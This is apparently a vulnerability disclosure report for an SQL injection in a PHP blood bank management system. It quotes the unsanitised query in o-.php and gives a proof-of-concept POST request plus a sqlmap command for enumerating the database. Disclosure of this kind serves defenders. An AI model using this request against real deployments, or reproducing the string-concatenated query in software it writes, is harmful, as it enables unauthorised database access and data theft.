# blood-bank-system-in-php-sql1

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

o-.php 

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

network remote.

## Vulnerability Type

sql injection

## Root Cause

o-.php file, SQL injection is used to obtain database information.

## Impact

## **Description of the vulnerability**

### o-.php

source code，the    bloodname parameter is not filtered and concatenated into the SQL statement.                                                                                                                                                                                                                                                                                                                                                                                                                                                               

```
$Bloodname=$_POST['bloodname'];
$availability=$_POST['Availibility'];
$unit=$_POST['unit'];
$hos=$_POST['hospital'];
$s = "select * from o_ where Bloodname= '$Bloodname'";
$result = mysqli_query($con, $s);
$num = mysqli_fetch_row($result);
```

![image-20240922221101957](https://github.com/user-attachments/assets/766f9232-8317-4f32-b221-cd1effacc9e4)



## **Vulnerability recurrence**

### **POC**

```
POST /admin/blood/update/o-.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/admin/bloodupdate.php
Cookie: PHPSESSID=rulomv90jlteeh3qr1g1ckb3en
Upgrade-Insecure-Requests: 1
Priority: u=0, i

bloodname=11&unit=1
```

save as 1.txt

```
python sqlmap.py -r "E:\1.txt"   --current-db --level 5
```

![image-20240922220831065](https://github.com/user-attachments/assets/ddef6619-dcfe-4c3f-bd50-ebcb895a5977)